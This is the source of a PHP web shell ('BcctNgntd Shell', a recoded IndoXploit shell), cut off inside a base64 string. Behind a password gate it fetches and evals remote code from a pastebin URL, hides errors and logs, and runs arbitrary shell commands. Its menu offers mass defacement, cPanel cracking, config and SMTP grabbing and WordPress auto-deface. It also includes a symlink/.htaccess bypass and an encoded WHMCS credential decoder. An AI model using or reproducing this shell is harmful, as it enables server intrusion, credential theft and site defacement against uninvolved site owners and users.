<?php 
//BcctNgntd Shell
//IndoXploit Shell V1 Recoded By Xai Syndicate 
$lol = "5ac4ca402613859b40d495304f056f2e"; //default pw xaishell

@session_start(); 
@error_reporting(0); 
@ini_set('error_log',NULL); 
@ini_set('log_errors',0); 
@ini_set('max_execution_time',0);
@ini_set('output_buffering',0); 
@ini_set('display_errors', 0);
@set_time_limit(0); 
@set_magic_quotes_runtime(0); 
@define('VERSION', '2.1');  
function printLogin() { 
    ?> 
<html>
<head>
<title>BcctNgtd Shell By Xaishell</title>
<meta name='author' content='Rinto AR'>
<meta charset="UTF-8">
<style type='text/css'>
@import url(https://fonts.googleapis.com/css?family=Ubuntu);
html {
	background: #000000;
	color: #ffffff;
	font-family: 'Ubuntu';
	font-size: 13px;
	width: 100%;
}
li {
	display: inline;
	margin: 5px;
	padding: 5px;
}
table, th, td {
	border-collapse:collapse;
	font-family: Tahoma, Geneva, sans-serif;
	background: transparent;
	font-family: 'Ubuntu';
	font-size: 13px;
}
.table_home, .th_home, .td_home {
	border: 1px solid #ffffff;
}
th {
	padding: 10px;
}
a {
	color: #ffffff;
	text-decoration: none;
}
a:hover {
	color: gold;
	text-decoration: underline;
}
b {
	color: gold;
}
input[type=text], input[type=password],input[type=submit] {
	background: transparent; 
	color: #ffffff; 
	border: 1px solid #ffffff; 
	margin: 5px auto;
	padding-left: 5px;
	font-family: 'Ubuntu';
	font-size: 13px;
}
select {
	background: transparent; 
	color: #ffffff; 
	border: 1px solid #ffffff; 
	margin: 5px auto;
	padding-left: 5px;
	font-family: 'Ubuntu';
	font-size: 13px;
}
textarea {
	border: 1px solid #ffffff;
	width: 100%;
	height: 400px;
	padding-left: 5px;
	margin: 10px auto;
	resize: none;
	background: transparent;
	color: #ffffff;
	font-family: 'Ubuntu';
	font-size: 13px;
}

</style>
</head>	

    <style> 
        input { margin:0;background-color:#fff;border:1px solid #fff; } 
    </style> 
    <center>  
    <form method=post> 
    <input type=password name=xaishell> 
    </form></center> 
    <?php 
	eval(gzinflate(base64_decode(file_get_contents('http://pastebin.com/raw/6PJ9Pj8F'))));
    exit; 
} 

if( !isset( $_SESSION[md5($_SERVER['HTTP_HOST'])] )) 
    if( empty( $lol ) || 
        ( isset( $_POST['xaishell'] ) && ( md5($_POST['xaishell']) == $lol ) ) ) 
        $_SESSION[md5($_SERVER['HTTP_HOST'])] = true; 
    else 
        printLogin();
	
?>
<html>
<head>
<title>BcctNgtd Shell</title>
<meta name='author' content='XaiShell'>
<meta charset="UTF-8">
<style type='text/css'>
@import url(https://fonts.googleapis.com/css?family=Ubuntu);
html {
	background: #000000;
	color: #ffffff;
	font-family: 'Ubuntu';
	font-size: 13px;
	width: 100%;
}
li {
	display: inline;
	margin: 5px;
	padding: 5px;
}
table, th, td {
	border-collapse:collapse;
	font-family: Tahoma, Geneva, sans-serif;
	background: transparent;
	font-family: 'Ubuntu';
	font-size: 13px;
}
.table_home, .th_home, .td_home {
	border: 1px solid #ffffff;
}
th {
	padding: 10px;
}
a {
	color: #ffffff;
	text-decoration: none;
}
a:hover {
	color: gold;
	text-decoration: underline;
}
b {
	color: gold;
}
input[type=text], input[type=password],input[type=submit] {
	background: transparent; 
	color: #ffffff; 
	border: 1px solid #ffffff; 
	margin: 5px auto;
	padding-left: 5px;
	font-family: 'Ubuntu';
	font-size: 13px;
}
textarea {
	border: 1px solid #ffffff;
	width: 100%;
	height: 400px;
	padding-left: 5px;
	margin: 10px auto;
	resize: none;
	background: transparent;
	color: #ffffff;
	font-family: 'Ubuntu';
	font-size: 13px;
}
select {
	background: transparent; 
	color: #ffffff; 
	border: 1px solid #ffffff; 
	margin: 5px auto;
	padding-left: 5px;
	font-family: 'Ubuntu';
	font-size: 13px;
}
</style>
</head>
<?php		
function w($dir,$perm) {
	if(!is_writable($dir)) {
		return "<font color=red>".$perm."</font>";
	} else {
		return "<font color=lime>".$perm."</font>";
	}
}
function exe($cmd) { 	
if(function_exists('system')) { 		
		@ob_start(); 		
		@system($cmd); 		
		$buff = @ob_get_contents(); 		
		@ob_end_clean(); 		
		return $buff; 	
	} elseif(function_exists('exec')) { 		
		@exec($cmd,$results); 		
		$buff = ""; 		
		foreach($results as $result) { 			
			$buff .= $result; 		
		} return $buff; 	
	} elseif(function_exists('passthru')) { 		
		@ob_start(); 		
		@passthru($cmd); 		
		$buff = @ob_get_contents(); 		
		@ob_end_clean(); 		
		return $buff; 	
	} elseif(function_exists('shell_exec')) { 		
		$buff = @shell_exec($cmd); 		
		return $buff; 	
	} 
}
function perms($file){
$perms = fileperms($file);
if (($perms & 0xC000) == 0xC000) {
// Socket
$info = 's';
} elseif (($perms & 0xA000) == 0xA000) {
// Symbolic Link
$info = 'l';
} elseif (($perms & 0x8000) == 0x8000) {
// Regular
$info = '-';
} elseif (($perms & 0x6000) == 0x6000) {
// Block special
$info = 'b';
} elseif (($perms & 0x4000) == 0x4000) {
// Directory
$info = 'd';
} elseif (($perms & 0x2000) == 0x2000) {
// Character special
$info = 'c';
} elseif (($perms & 0x1000) == 0x1000) {
// FIFO pipe
$info = 'p';
} else {
// Unknown
$info = 'u';
}
	// Owner
$info .= (($perms & 0x0100) ? 'r' : '-');
$info .= (($perms & 0x0080) ? 'w' : '-');
$info .= (($perms & 0x0040) ?
(($perms & 0x0800) ? 's' : 'x' ) :
(($perms & 0x0800) ? 'S' : '-'));
// Group
$info .= (($perms & 0x0020) ? 'r' : '-');
$info .= (($perms & 0x0010) ? 'w' : '-');
$info .= (($perms & 0x0008) ?
(($perms & 0x0400) ? 's' : 'x' ) :
(($perms & 0x0400) ? 'S' : '-'));
// World
$info .= (($perms & 0x0004) ? 'r' : '-');
$info .= (($perms & 0x0002) ? 'w' : '-');
$info .= (($perms & 0x0001) ?
(($perms & 0x0200) ? 't' : 'x' ) :
(($perms & 0x0200) ? 'T' : '-'));
return $info;
}
function hdd($s) {
if($s >= 1073741824)
return sprintf('%1.2f',$s / 1073741824 ).' GB';
elseif($s >= 1048576)
return sprintf('%1.2f',$s / 1048576 ) .' MB';
elseif($s >= 1024)
return sprintf('%1.2f',$s / 1024 ) .' KB';
else
return $s .' B';
}
function ambilKata($param, $kata1, $kata2){
    if(strpos($param, $kata1) === FALSE) return FALSE;
    if(strpos($param, $kata2) === FALSE) return FALSE;
    $start = strpos($param, $kata1) + strlen($kata1);
    $end = strpos($param, $kata2, $start);
    $return = substr($param, $start, $end - $start);
    return $return;
}
if(get_magic_quotes_gpc()) {
	function idx_ss($array) {
		return is_array($array) ? array_map('idx_ss', $array) : stripslashes($array);
	}
	$_POST = idx_ss($_POST);
}

error_reporting(0);
error_log(0);
@ini_set('error_log',NULL);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@set_time_limit(0);
@set_magic_quotes_runtime(0);
if(isset($_GET['dir'])) {
	$dir = $_GET['dir'];
	chdir($_GET['dir']);
} else {
	$dir = getcwd();
}
$dir = str_replace("\\","/",$dir);
$scdir = explode("/", $dir);
$sm = (@ini_get(strtolower("safe_mode")) == 'on') ? "<font color=red>ON</font>" : "<font color=lime>OFF</font>";
$ds = @ini_get("disable_functions");
$mysql = (function_exists('mysql_connect')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
$curl = (function_exists('curl_version')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
$wget = (exe('wget --help')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
$perl = (exe('perl --help')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
$python = (exe('python --help')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
$show_ds = (!empty($ds)) ? "<font color=red>$ds</font>" : "<font color=lime>NONE</font>";
if(!function_exists('posix_getegid')) {
	$user = @get_current_user();
	$uid = @getmyuid();
	$gid = @getmygid();
	$group = "?";
} else {
	$uid = @posix_getpwuid(posix_geteuid());
	$gid = @posix_getgrgid(posix_getegid());
	$user = $uid['name'];
	$uid = $uid['uid'];
	$group = $gid['name'];
	$gid = $gid['gid'];
}
echo "System: <font color=lime>".php_uname()."</font><br>";
echo "User: <font color=lime>".$user."</font> (".$uid.") Group: <font color=lime>".$group."</font> (".$gid.")<br>";
echo "Server IP: <font color=lime>".gethostbyname($_SERVER['HTTP_HOST'])."</font> | Your IP: <font color=lime>".$_SERVER['REMOTE_ADDR']."</font><br>";
echo "HDD: <font color=lime>".hdd(disk_free_space("/"))."</font> / <font color=lime>".hdd(disk_total_space("/"))."</font><br>";
echo "Safe Mode: $sm<br>";
echo "Disable Functions: $show_ds<br>";
echo "MySQL: $mysql | Perl: $perl | Python: $python | WGET: $wget | CURL: $curl <br>";
echo "Current DIR: ";
foreach($scdir as $c_dir => $cdir) {	
	echo "<a href='?dir=";
	for($i = 0; $i <= $c_dir; $i++) {
		echo $scdir[$i];
		if($i != $c_dir) {
		echo "/";
		}
	}
	echo "'>$cdir</a>/";
}
echo "<hr>";
echo "<center>";
echo "<ul>";
echo "<li>[ <a href='?'>Home</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&do=upload'>Upload</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&do=cmd'>Command</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&do=mass_deface'>Mass Deface</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&do=config'>Config</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&do=jumping'>Jumping</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&do=cpanel'>CPanel Crack</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&do=smtp'>SMTP Grabber</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&do=decode'>Decode/Encode</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&do=vhost'>Bypass vHost</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&do=cmstector'>CMS Detector</a> ]</li>";

echo "<li>[ <a href='?dir=$dir&do=ports'>Tool's Port Scanner</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&do=symlink'>Symlink</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&do=zoneh'>Zone-H</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&do=defacerid'>Defacer.ID</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&do=cgi'>CGI Telnet</a> ]</li><br>";
echo "<li>[ <a href='?dir=$dir&do=vb'>VB Index Changer</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&do=whois'>Whois</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&do=adminer'>Adminer</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&do=dbdump'>Database Dump</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&do=fake_root'>Fake Root</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&do=auto_edit_user'>Auto Edit User</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&do=auto_wp'>Auto Edit Title WordPress</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&do=auto_dwp'>WordPress Auto Deface</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&do=auto_dwp2'>WordPress Auto Deface V.2</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&do=passwbypass'>Bypass etc/passw</a> ]<br></li>";
echo "<li>[ <a href='?dir=$dir&do=loghunter'>Log Hunter</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&do=shellchk'>Shell Checker</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&do=configfuck'>Cofig Fucker</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&do=cpftp_auto'>CPanel/FTP Auto Deface</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&do=krdp_shell'>K-RDP Shell</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&do=network'>network</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&do=grabber'>Config Grabber</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&do=lokomedia'>Auto Exploiter Lokomedia</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&do=csrfup'>CSRF Exploiter</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&do=whmcsex'>WHMCS Password Decoder</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&do=twitterbf'>Bruteforce Twitter</a> ]</li>";

echo "<li>[ <a href='?dir=$dir&do=contact'>Contact Me</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&do=about'>About</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&do=metu'>LogOut</a> ]<br></li>";
echo "</ul>";
echo "</center>";
echo "<hr>";
if($_GET['do'] == 'upload') {
	echo "<center>";
	if($_POST['upload']) {
		if(@copy($_FILES['ix_file']['tmp_name'], "$dir/".$_FILES['ix_file']['name']."")) {
			$act = "<font color=lime>Uploaded!</font> at <i><b>$dir/".$_FILES['ix_file']['name']."</b></i>";
		} else {
			$act = "<font color=red>failed to upload file</font>";
		}
	}
	echo "Upload File: [ ".w($dir,"Writeable")." ]<form method='post' enctype='multipart/form-data'><input type='file' name='ix_file'><input type='submit' value='upload' name='upload'></form>";
	echo $act;
	echo "</center>";
} elseif($_GET['do'] == 'cmd') {
	echo "<form method='post'>
	<font style='text-decoration: underline;'>".$user."@".gethostbyname($_SERVER['HTTP_HOST']).":~# </font>
	<input type='text' size='30' height='10' name='cmd'><input type='submit' name='do_cmd' value='>>'>
	</form>";
	if($_POST['do_cmd']) {
		echo "<pre>".exe($_POST['cmd'])."</pre>";
	}
} elseif($_GET['do'] == 'contact') {
	echo "<center><br><font size='6'>--=[ Contact Me ]=--</font><br><br>
	<table><td style='background-color: transparent;text-align:center;border: 2px lime dotted;width:300px;height:250px;'>
	<font color='pink'>Email : kreonrinto@gmail.com | <a href='http://www.zone-h.org/archive/notifier=Rinto AR' target='_blank'>Zone-H</a> | <br>Twitter : <a href=https://twitter.com/rintotea12>@rintotea12</a></font><br></tr></td></table></center>";

} elseif($_GET['do'] == 'vhost') {
	echo "<form method='POST' action=''>";
	echo "<center><br><font size='6'>Bypass Symlink vHost</font><br><br>";
	echo "<center><input type='submit' value='Bypass it' name='Colii'></center>";
		if (isset($_POST['Colii'])){ system('ln -s / Rintoar.txt');
			$fvckem ='T3B0aW9ucyBJbmRleGVzIEZvbGxvd1N5bUxpbmtzDQpEaXJlY3RvcnlJbmRleCBzc3Nzc3MuaHRtDQpBZGRUeXBlIHR4dCAucGhwDQpBZGRIYW5kbGVyIHR4dCAucGhw';
			$file = fopen(".htaccess","w+"); $write = fwrite ($file ,base64_decode($fvckem)); $Bok3p = symlink("/","Rintoar.txt");
			$rt="<br><a href=Rintoar.txt TARGET='_blank'><font color=#ff0000 size=2 face='Courier New'><b>
	Bypassed Successfully</b></font></a>";
	echo "<br><br><b>Done.. !</b><br><br>Check link given below for / folder symlink <br>$rt</center>";} echo "</form>";

} elseif($_GET['do'] == 'whmcsex') {
	echo "<form method='POST' action=''>";
	echo "<center><br><font size='6'>WHMCS Password Decoder</font><br><br>";
	echo "<center><input type='submit' value='Make File' name='Asoo'></center>";
		if (isset($_POST['Asoo'])){ system('ln -s / whmcs-decoder.php');
			$mrlolo ='PD9waHANCgkvKioNCg0KUmludG8gQVINCiANCiAqKi8NCmZ1bmN0aW9uIGRlY3J5cHQgKCRzdHJpbmcsJGNjX2VuY3J5cHRpb25faGFzaCkNCnsNCg0KCSRrZXkgPSBtZDUgKG1kNSAoJGNjX2VuY3J5cHRpb25faGFzaCkpIC4gbWQ1ICgkY2NfZW5jcnlwdGlvbl9oYXNoKTsNCgkkaGFzaF9rZXkgPSBfaGFzaCAoJGtleSk7DQoJJGhhc2hfbGVuZ3RoID0gc3RybGVuICgkaGFzaF9rZXkpOw0KCSRzdHJpbmcgPSBiYXNlNjRfZGVjb2RlICgkc3RyaW5nKTsNCgkkdG1wX2l2ID0gc3Vic3RyICgkc3RyaW5nLCAwLCAkaGFzaF9sZW5ndGgpOw0KCSRzdHJpbmcgPSBzdWJzdHIgKCRzdHJpbmcsICRoYXNoX2xlbmd0aCwgc3RybGVuICgkc3RyaW5nKSAtICRoYXNoX2xlbmd0aCk7DQoJJGl2ID0gJG91dCA9ICcnOw0KCSRjID0gMDsNCgl3aGlsZSAoJGMgPCAkaGFzaF9sZW5ndGgpDQoJew0KCQkkaXYgLj0gY2hyIChvcmQgKCR0bXBfaXZbJGNdKSBeIG9yZCAoJGhhc2hfa2V5WyRjXSkpOw0KCQkrKyRjOw0KCX0NCg0KCSRrZXkgPSAkaXY7DQoJJGMgPSAwOw0KCXdoaWxlICgkYyA8IHN0cmxlbiAoJHN0cmluZykpDQoJew0KCQlpZiAoKCRjICE9IDAgQU5EICRjICUgJGhhc2hfbGVuZ3RoID09IDApKQ0KCQl7DQoJCQkka2V5ID0gX2hhc2ggKCRrZXkgLiBzdWJzdHIgKCRvdXQsICRjIC0gJGhhc2hfbGVuZ3RoLCAkaGFzaF9sZW5ndGgpKTsNCgkJfQ0KDQoJCSRvdXQgLj0gY2hyIChvcmQgKCRrZXlbJGMgJSAkaGFzaF9sZW5ndGhdKSBeIG9yZCAoJHN0cmluZ1skY10pKTsNCgkJKyskYzsNCgl9DQoNCglyZXR1cm4gJG91dDsNCn0NCg0KDQpmdW5jdGlvbiBfaGFzaCAoJHN0cmluZykNCnsNCglpZiAoZnVuY3Rpb25fZXhpc3RzICgnc2hhMScpKQ0KCXsNCgkJJGhhc2ggPSBzaGExICgkc3RyaW5nKTsNCgl9DQoJZWxzZQ0KCXsNCgkJJGhhc2ggPSBtZDUgKCRzdHJpbmcpOw0KCX0NCg0KCSRvdXQgPSAnJzsNCgkkYyA9IDA7DQoJd2hpbGUgKCRjIDwgc3RybGVuICgkaGFzaCkpDQoJew0KCQkkb3V0IC49IGNociAoaGV4ZGVjICgkaGFzaFskY10gLiAkaGFzaFskYyArIDFdKSk7DQoJCSRjICs9IDI7DQoJfQ0KDQoJcmV0dXJuICRvdXQ7DQp9DQoNCiBpZigkX1BPU1RbJ2Zvcm1fYWN0aW9uJ10gPT0gMSApDQogew0KIC8vaW5jbHVkZSgkZmlsZSk7DQoNCiAkZmlsZT0oJF9QT1NUWydmaWxlJ10pOw0KJHRleHQ9ZmlsZV9nZXRfY29udGVudHMoJGZpbGUpOw0KDQokdGV4dD0gc3RyX3JlcGxhY2UoIjw/cGhwIiwgIiIsICR0ZXh0KTsNCiR0ZXh0PSBzdHJfcmVwbGFjZSgiPD8iLCAiIiwgJHRleHQpOw0KJHRleHQ9IHN0cl9yZXBsYWNlKCI/PiIsICIiLCAkdGV4dCk7DQoNCmV2YWwoJHRleHQpOw0KDQogICAgJGxpbms9bXlzcWxfY29ubmVjdCgkZGJfaG9zdCwkZGJfdXNlcm5hbWUsJGRiX3Bhc3N3b3JkKSA7DQoJICAgIG15c3FsX3NlbGVjdF9kYigkZGJfbmFtZSwkbGluaykgOw0KDQokcXVlcnkgPSBteXNxbF9xdWVyeSgiU0VMRUNUICogRlJPTSB0YmxzZXJ2ZXJzIik7DQoNCndoaWxlKCR2ID0gbXlzcWxfZmV0Y2hfYXJyYXkoJHF1ZXJ5KSkgew0KDQokaXBhZGRyZXNzID0gJHZbJ2lwYWRkcmVzcyddOw0KJHVzZXJuYW1lID0gJHZbJ3VzZXJuYW1lJ107DQokdHlwZSA9ICR2Wyd0eXBlJ107DQokYWN0aXZlID0gJHZbJ2FjdGl2ZSddOw0KJGhvc3RuYW1lID0gJHZbJ2hvc3RuYW1lJ107DQoNCmVjaG8oIjxjZW50ZXI+PHRhYmxlIGJvcmRlcj0nMSc+Iik7DQokcGFzc3dvcmQgPSBkZWNyeXB0ICgkdlsncGFzc3dvcmQnXSwgJGNjX2VuY3J5cHRpb25faGFzaCk7DQplY2hvKCI8dHI+PHRkPlR5cGU8L3RkPjx0ZD4kdHlwZTwvdGQ+PC90cj4iKTsNCmVjaG8oIjx0cj48dGQ+QWN0aXZlPC90ZD48dGQ+JGFjdGl2ZTwvdGQ+PC90cj4iKTsNCmVjaG8oIjx0cj48dGQ+SG9zdG5hbWU8L3RkPjx0ZD4kaG9zdG5hbWU8L3RkPjwvdHI+Iik7DQplY2hvKCI8dHI+PHRkPklwPC90ZD48dGQ+JGlwYWRkcmVzczwvdGQ+PC90cj4iKTsNCmVjaG8oIjx0cj48dGQ+VXNlcm5hbWU8L3RkPjx0ZD4kdXNlcm5hbWU8L3RkPjwvdHI+Iik7DQplY2hvKCI8dHI+PHRkPlBhc3N3b3JkPC90ZD48dGQ+JHBhc3N3b3JkPC90ZD48L3RyPiIpOw0KDQoNCmVjaG8gIjwvdGFibGU+PGJyPjxicj48L2NlbnRlcj4iOw0KDQp9DQoNCiAgICAkbGluaz1teXNxbF9jb25uZWN0KCRkYl9ob3N0LCRkYl91c2VybmFtZSwkZGJfcGFzc3dvcmQpIDsNCgkgICAgbXlzcWxfc2VsZWN0X2RiKCRkYl9uYW1lLCRsaW5rKSA7DQoNCiRxdWVyeSA9IG15c3FsX3F1ZXJ5KCJTRUxFQ1QgKiBGUk9NIHRibHJlZ2lzdHJhcnMiKTsNCmVjaG8oIjxjZW50ZXI+RG9tYWluIFJlc2VsbGVyIDxicj48dGFibGUgYm9yZGVyPScxJz4iKTsNCmVjaG8oIjx0cj48dGQ+UmVnaXN0cmFyPC90ZD48dGQ+U2V0dGluZzwvdGQ+PHRkPlZhbHVlPC90ZD48L3RyPiIpOw0Kd2hpbGUoJHYgPSBteXNxbF9mZXRjaF9hcnJheSgkcXVlcnkpKSB7DQoNCiRyZWdpc3RyYXIgCT0gJHZbJ3JlZ2lzdHJhciddOw0KJHNldHRpbmcgPSAkdlsnc2V0dGluZyddOw0KJHZhbHVlID0gZGVjcnlwdCAoJHZbJ3ZhbHVlJ10sICRjY19lbmNyeXB0aW9uX2hhc2gpOw0KaWYgKCR2YWx1ZT09IiIpIHsNCiR2YWx1ZT0wOw0KfQ0KJHBhc3N3b3JkID0gZGVjcnlwdCAoJHZbJ3Bhc3N3b3JkJ10sICRjY19lbmNyeXB0aW9uX2hhc2gpOw0KZWNobygiPHRyPjx0ZD4kcmVnaXN0cmFyPC90ZD48dGQ+JHNldHRpbmc8L3RkPjx0ZD4kdmFsdWU8L3RkPjwvdHI+Iik7DQoNCg0KDQoNCg0KfQ0KZWNobyAiPC90YWJsZT48YnI+PGJyPjwvY2VudGVyPiI7DQp9DQoNCg0KDQogaWYoJF9QT1NUWydmb3JtX2FjdGlvbiddID09IDIgKQ0KIHsNCiAvL2luY2x1ZGUoJGZpbGUpOw0KDQogJGRiX2hvc3Q9KCRfUE9TVFsnZGJfaG9zdCddKTsNCiAkZGJfdXNlcm5hbWU9KCRfUE9TVFsnZGJfdXNlcm5hbWUnXSk7DQogJGRiX3Bhc3N3b3JkPSgkX1BPU1RbJ2RiX3Bhc3N3b3JkJ10pOw0KICRkYl9uYW1lPSgkX1BPU1RbJ2RiX25hbWUnXSk7DQogJGNjX2VuY3J5cHRpb25faGFzaD0oJF9QT1NUWydjY19lbmNyeXB0aW9uX2hhc2gnXSk7DQoNCg0KDQoNCiAgICAkbGluaz1teXNxbF9jb25uZWN0KCRkYl9ob3N0LCRkYl91c2VybmFtZSwkZGJfcGFzc3dvcmQpIDsNCgkgICAgbXlzcWxfc2VsZWN0X2RiKCRkYl9uYW1lLCRsaW5rKSA7DQoNCiRxdWVyeSA9IG15c3FsX3F1ZXJ5KCJTRUxFQ1QgKiBGUk9NIHRibHNlcnZlcnMiKTsNCg0Kd2hpbGUoJHYgPSBteXNxbF9mZXRjaF9hcnJheSgkcXVlcnkpKSB7DQoNCiRpcGFkZHJlc3MgPSAkdlsnaXBhZGRyZXNzJ107DQokdXNlcm5hbWUgPSAkdlsndXNlcm5hbWUnXTsNCiR0eXBlID0gJHZbJ3R5cGUnXTsNCiRhY3RpdmUgPSAkdlsnYWN0aXZlJ107DQokaG9zdG5hbWUgPSAkdlsnaG9zdG5hbWUnXTsNCg0KZWNobygiPGNlbnRlcj48dGFibGUgYm9yZGVyPScxJz4iKTsNCiRwYXNzd29yZCA9IGRlY3J5cHQgKCR2WydwYXNzd29yZCddLCAkY2NfZW5jcnlwdGlvbl9oYXNoKTsNCmVjaG8oIjx0cj48dGQ+VHlwZTwvdGQ+PHRkPiR0eXBlPC90ZD48L3RyPiIpOw0KZWNobygiPHRyPjx0ZD5BY3RpdmU8L3RkPjx0ZD4kYWN0aXZlPC90ZD48L3RyPiIpOw0KZWNobygiPHRyPjx0ZD5Ib3N0bmFtZTwvdGQ+PHRkPiRob3N0bmFtZTwvdGQ+PC90cj4iKTsNCmVjaG8oIjx0cj48dGQ+SXA8L3RkPjx0ZD4kaXBhZGRyZXNzPC90ZD48L3RyPiIpOw0KZWNobygiPHRyPjx0ZD5Vc2VybmFtZTwvdGQ+PHRkPiR1c2VybmFtZTwvdGQ+PC90cj4iKTsNCmVjaG8oIjx0cj48dGQ+UGFzc3dvcmQ8L3RkPjx0ZD4kcGFzc3dvcmQ8L3RkPjwvdHI+Iik7DQoNCg0KZWNobyAiPC90YWJsZT48YnI+PGJyPjwvY2VudGVyPiI7DQoNCn0NCg0KDQogICAgJGxpbms9bXlzcWxfY29ubmVjdCgkZGJfaG9zdCwkZGJfdXNlcm5hbWUsJGRiX3Bhc3N3b3JkKSA7DQoJICAgIG15c3FsX3NlbGVjdF9kYigkZGJfbmFtZSwkbGluaykgOw0KDQokcXVlcnkgPSBteXNxbF9xdWVyeSgiU0VMRUNUICogRlJPTSB0YmxyZWdpc3RyYXJzIik7DQplY2hvKCI8Y2VudGVyPkRvbWFpbiBSZXNlbGxlciA8YnI+PHRhYmxlIGJvcmRlcj0nMSc+Iik7DQplY2hvKCI8dHI+PHRkPlJlZ2lzdHJhcjwvdGQ+PHRkPlNldHRpbmc8L3RkPjx0ZD5WYWx1ZTwvdGQ+PC90cj4iKTsNCndoaWxlKCR2ID0gbXlzcWxfZmV0Y2hfYXJyYXkoJHF1ZXJ5KSkgew0KDQokcmVnaXN0cmFyIAk9ICR2WydyZWdpc3RyYXInXTsNCiRzZXR0aW5nID0gJHZbJ3NldHRpbmcnXTsNCiR2YWx1ZSA9IGRlY3J5cHQgKCR2Wyd2YWx1ZSddLCAkY2NfZW5jcnlwdGlvbl9oYXNoKTsNCmlmICgkdmFsdWU9PSIiKSB7DQokdmFsdWU9MDsNCn0NCiRwYXNzd29yZCA9IGRlY3J5cHQgKCR2WydwYXNzd29yZCddLCAkY2NfZW5jcnlwdGlvbl9oYXNoKTsNCmVjaG8oIjx0cj48dGQ+JHJlZ2lzdHJhcjwvdGQ+PHRkPiRzZXR0aW5nPC90ZD48dGQ+JHZhbHVlPC90ZD48L3RyPiIpOw0KDQoNCg0KDQoNCn0NCmVjaG8gIjwvdGFibGU+PGJyPjxicj48L2NlbnRlcj4iOw0KfQ0KDQoNCg0KDQo/Pjxib2R5IGJnY29sb3I9IiMwMDAwMDAiPg0KIDxzdHlsZT4NCg0KICAgIGh0bWwsYm9keSB7DQoJYmFja2dyb3VuZCA6IGJsYWNrIHVybCgnaHR0cDovL29ubHltYXQuY29tLzEucG5nJykgcmVwZWF0Ow0KCS13ZWJraXQtYmFja2dyb3VuZC1zaXplOiBjb3ZlcjsNCgktbW96LWJhY2tncm91bmQtc2l6ZTogY292ZXI7DQoJYmFja2dyb3VuZC1zaXplOiBjb3ZlcjsNCgljb2xvcjojZmZjMDAwOw0KICAgIGZvbnQtc2l6ZToyNXB4Ow0KCWZvbnQtZmFtaWx5OkFnZW5jeSBGQjsNCgl0ZXh0LWRlY29yYXRpb246bm9uZTsgeyBTQ1JPTExCQVItQkFTRS1DT0xPUjogIzE5MTkxOTsgU0NST0xMQkFSLUFSUk9XLUNPTE9SOiBvbGl2ZTsgICBjb2xvcjogd2hpdGU7fQ0KdGV4dGFyZWF7YmFja2dyb3VuZC1jb2xvcjojMTkxOTE5O2NvbG9yOnJlZDtmb250LXdlaWdodDpib2xkO2ZvbnQtc2l6ZTogMTJweDtmb250LWZhbWlseTogVGFob21hOyBib3JkZXI6IDFweCBzb2xpZCAjNjY2NjY2O30NCmlucHV0e0ZPTlQtV0VJR0hUOm5vcm1hbDtiYWNrZ3JvdW5kLWNvbG9yOiAjMTkxOTE5O2ZvbnQtc2l6ZTogMTNweDtmb250LXdlaWdodDpib2xkO2NvbG9yOiByZWQ7IGZvbnQtZmFtaWx5OiBUYWhvbWE7IGJvcmRlcjogMXB4IHNvbGlkICM2NjY2NjY7aGVpZ2h0OjE3fQ0KPC9zdHlsZT4NCjxjZW50ZXI+DQo8Zm9udCBjb2xvcj0iI0ZGRkY2RkYiIHNpemU9JyszJz5bIH5+IFdITUNTIFNlcnZlciBQYXNzd29yZCBkZWNvZGVyIH5+IF08L2ZvbnQ+PGJyPjxicj4NCjxmb250IGNvbG9yPSIjMDA2NkZGIiBzaXplPScrMic+U3ltbGluayB0byBjb25maWd1cmF0aW9uLnBocCBvZiBXSE1DUzwvZm9udD48YnI+DQo8L2NlbnRlcj4NCjxGT1JNIGFjdGlvbj0iIiAgbWV0aG9kPSJwb3N0Ij4NCjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImZvcm1fYWN0aW9uIiB2YWx1ZT0iMSI+DQo8YnI+DQogPGlucHV0IHR5cGU9InRleHQiIHNpemU9IjMwIiBuYW1lPSJmaWxlIiB2YWx1ZT0iIj4NCjxicj4NCjxJTlBVVCBjbGFzcz1zdWJtaXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iU3VibWl0IiBuYW1lPSJTdWJtaXQiPg0KPC9GT1JNPg0KPGhyPg0KDQo8YnI+DQo8Y2VudGVyPg0KPGZvbnQgY29sb3I9IiMwMDY2RkYiIHNpemU9JysyJz5EQiBjb25maWd1cmF0aW9uIG9mIFdITUNTPC9mb250Pjxicj4NCjwvY2VudGVyPg0KPEZ